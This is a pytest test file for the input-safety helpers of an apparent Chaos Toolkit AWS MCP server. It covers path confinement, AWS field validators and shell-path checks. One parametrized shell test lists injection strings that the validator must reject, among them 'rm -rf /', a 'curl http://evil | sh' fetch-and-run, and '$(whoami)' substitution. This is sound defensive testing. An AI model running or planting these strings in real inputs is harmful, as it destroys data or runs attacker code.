"""Tests for the safety helpers."""

from __future__ import annotations

from pathlib import Path

import pytest

from chaostoolkit_aws_mcp_server import safety


class TestPathConfinement:
    def test_relative_output_is_created_inside_workdir(self, workdir: Path) -> None:
        path = safety.resolve_output_path("nested/dir/experiment.json", "./default.json")

        assert path == workdir / "nested/dir/experiment.json"
        assert path.parent.is_dir()

    def test_default_is_used_when_missing(self, workdir: Path) -> None:
        assert safety.resolve_output_path(None, "./default.json") == workdir / "default.json"

    def test_parent_traversal_is_rejected(self, workdir: Path) -> None:
        with pytest.raises(safety.ValidationError, match="must stay inside"):
            safety.resolve_output_path("../escape.json", "./default.json")

    def test_absolute_path_outside_workdir_is_rejected(self, workdir: Path) -> None:
        with pytest.raises(safety.ValidationError, match="must stay inside"):
            safety.resolve_output_path("/etc/chaos.json", "./default.json")

    def test_non_json_suffix_is_rejected(self, workdir: Path) -> None:
        with pytest.raises(safety.ValidationError, match=r"must end with \.json"):
            safety.resolve_output_path("experiment.yaml", "./default.json")

    def test_existing_file_must_exist(self, workdir: Path) -> None:
        with pytest.raises(safety.ValidationError, match="not found"):
            safety.resolve_existing_file("missing.json", "experiment_file")

        (workdir / "there.json").write_text("{}", encoding="utf-8")
        assert safety.resolve_existing_file("there.json", "experiment_file").name == "there.json"

    def test_working_directory_defaults_to_workdir(self, workdir: Path) -> None:
        assert safety.resolve_directory(None) == workdir
        with pytest.raises(safety.ValidationError, match="not found"):
            safety.resolve_directory("nope")


class TestValidators:
    def test_instance_ids(self) -> None:
        assert safety.match_all(safety.INSTANCE_ID, ["i-0123456789abcdef0"], "instance_ids")
        with pytest.raises(safety.ValidationError, match=r"instance_ids\[0\]"):
            safety.match_all(safety.INSTANCE_ID, ["not-an-instance"], "instance_ids")

    def test_availability_zone(self) -> None:
        assert safety.match(safety.AVAILABILITY_ZONE, "cn-north-1a", "az") == "cn-north-1a"
        with pytest.raises(safety.ValidationError):
            safety.match(safety.AVAILABILITY_ZONE, "cn-north-1", "az")

    def test_integer_bounds(self) -> None:
        assert safety.integer(None, "n", minimum=1, maximum=10, default=5) == 5
        with pytest.raises(safety.ValidationError, match="between 1 and 10"):
            safety.integer(99, "n", minimum=1, maximum=10, default=5)
        with pytest.raises(safety.ValidationError, match="must be an integer"):
            safety.integer(True, "n", minimum=1, maximum=10, default=5)

    def test_choice_and_boolean(self) -> None:
        assert safety.choice(None, {"a", "b"}, "x", default="a") == "a"
        with pytest.raises(safety.ValidationError, match=r"must be one of \['a', 'b'\]"):
            safety.choice("c", {"a", "b"}, "x")
        with pytest.raises(safety.ValidationError, match="must be a boolean"):
            safety.boolean("yes", "flag", default=False)

    def test_filters_and_tags(self) -> None:
        assert safety.tag_filters([{"Name": "tag:A", "Values": ["1"]}], "filters")
        with pytest.raises(safety.ValidationError, match="must have 'Name' and 'Values'"):
            safety.tag_filters([{"Name": "tag:A"}], "filters")
        with pytest.raises(safety.ValidationError, match="must have 'Key' and 'Value'"):
            safety.key_value_tags([{"Key": "A"}], "tags")


class TestShellSafety:
    @pytest.mark.parametrize(
        "value",
        [
            "/tmp; rm -rf /",
            "/tmp && curl http://evil | sh",
            "/tmp/$(whoami)",
            "relative/path",
            "/tmp/`id`",
        ],
    )
    def test_shell_path_rejects_injection(self, value: str) -> None:
        with pytest.raises(safety.ValidationError):
            safety.shell_path(value, "path")

    def test_shell_path_rejects_traversal(self) -> None:
        with pytest.raises(safety.ValidationError, match="must not contain"):
            safety.shell_path("/tmp/../etc", "path")

    def test_shell_path_accepts_plain_path(self) -> None:
        assert safety.shell_path("/var/tmp", "path") == "/var/tmp"

    def test_quote(self) -> None:
        assert safety.quote("/var/tmp/chaos_fill") == "/var/tmp/chaos_fill"
        assert safety.quote("a b") == "'a b'"

    def test_destructive_markers(self) -> None:
        assert safety.is_destructive(["terminate_instances"])
        assert not safety.is_destructive(["list_instances"])
